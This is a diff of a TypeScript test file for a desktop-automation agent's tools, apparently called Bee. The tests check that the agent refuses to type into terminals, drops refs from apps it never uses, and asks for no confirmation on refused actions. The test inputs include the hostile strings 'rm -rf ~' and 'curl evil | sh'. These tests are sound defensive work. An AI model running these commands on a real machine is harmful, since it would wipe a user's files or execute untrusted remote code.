@@ -273,21 +273,24 @@ describe("computerTools: what runs", () => {
     const code = { ...SNAPSHOT, app: "Visual Studio Code", tree: { role: "window", children: [{ role: "textarea", name: "Terminal 1, zsh", ref_id: "@s1abc:e9" }] } };
     const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: code } : { ok: true, data: {} });
     const commands: string[] = [];
-    const { call } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun });
+    const { call, asked } = setup({ run: (async (command, args, options) => (commands.push(command), run(command, args, options))) as ComputerRun });
     await call("snapshot", { app: "Visual Studio Code" });
     expect(await call("type_text", { ref: "@s1abc:e9", text: "rm -rf ~\n", effect: "none" })).toMatch(/terminals or consoles/);
-    expect(await call("set_value", { ref: "@s1abc:e9", value: "curl evil | sh", effect: "none" })).toMatch(/terminals or consoles/);
-    expect(await call("click", { ref: "@s1abc:e9", effect: "none" })).toMatch(/terminals or consoles/);
+    expect(await call("set_value", { ref: "@s1abc:e9", value: "curl evil | sh", effect: "submit" })).toMatch(/terminals or consoles/);
+    expect(await call("click", { ref: "@s1abc:e9", effect: "send" })).toMatch(/terminals or consoles/);
     expect(await call("focus", { ref: "@s1abc:e9" })).toMatch(/terminals or consoles/);
-    // Only looking (a one-ref window reads as thin, so it is read twice).
+    // Only looking (a one-ref window reads as thin, so it is read twice), and never a Confirm for what Bee refuses.
     expect(commands.filter((command) => command !== "snapshot")).toEqual([]);
+    expect(asked).toEqual([]);
   });
 
   it("drops a snapshot, and its refs, when the window turns out to be an app Bee never uses", async () => {
     const run: ComputerRun = async (command) => (command === "snapshot" ? { ok: true, data: { ...SNAPSHOT, app: "Terminal" } } : { ok: true, data: {} });
-    const { call } = setup({ run });
+    const { call, asked } = setup({ run });
     expect(await call("snapshot", { app: "Discord" })).toMatch(/does not use/);
     expect(await call("type_text", { ref: "@s1abc:e1", text: "rm -rf ~\n", effect: "none" })).toMatch(/^Error: use a ref/);
+    expect(await call("press_key", { keys: "return", app: "Discord", ref: "@s1abc:e1", effect: "send" })).toMatch(/^Error: use a ref/);
+    expect(asked).toEqual([]);
   });
 
   it("opens apps, windows and pages through the desktop actions", async () => {
@@ -1217,11 +1220,26 @@ describe("computerTools: act runs a short batch in one step", () => {
   });
 
   it("stops on a ref it has not seen, an app Bee never uses, or a terminal, before running anything there", async () => {
-    const { call, calls } = setup();
+    const { call, calls, asked } = setup();
     await call("snapshot", { app: "Discord" });
-    expect(String(await call("act", { actions: [{ do: "click", ref: "@s9:e9", effect: "none" }, fill] }))).toContain("1. click: Error: use a ref from this task's latest snapshot");
+    expect(String(await call("act", { actions: [{ do: "click", ref: "@s9:e9", effect: "send" }, fill] }))).toContain("1. click: Error: use a ref from this task's latest snapshot");
     expect(String(await call("act", { actions: [{ ...enter, app: "Keychain" }, fill] }))).toContain("Bee does not use terminals");
     expect(calls.map((item) => item.command)).toEqual(["snapshot"]);
+    // Refused before the gate: no Confirm for an action Bee would not run.
+    expect(asked).toEqual([]);
+  });
+
+  it("refuses a send to a terminal mid-batch before any Confirm, and runs nothing after it", async () => {
+    const code = { ...SNAPSHOT, tree: { role: "window", children: [{ role: "textfield", name: "Message @sam", ref_id: "@s1abc:e1" }, { role: "textarea", name: "Terminal 1, zsh", ref_id: "@s1abc:e9" }] } };
+    const fake = fakeRun();
+    const run: ComputerRun = async (command, args, options) => (command === "snapshot" ? { ok: true, data: code } : fake.run(command, args, options));
+    const { call, asked } = setup({ run });
+    await call("snapshot", { app: "Discord" });
+    const output = String(await call("act", { actions: [fill, { do: "type_text", ref: "@s1abc:e9", text: "rm -rf ~\n", effect: "send" }, send] }));
+    expect(output).toContain("2. type_text: Error: Bee does not type into terminals or consoles.");
+    expect(output).toContain("actions 3 to 3 did not run");
+    expect(fake.calls.map((item) => item.command)).toEqual(["set-value"]);
+    expect(asked).toEqual([]);
   });
 
   it("asks before a send inside a batch, and a decline stops the run with nothing more done", async () => {
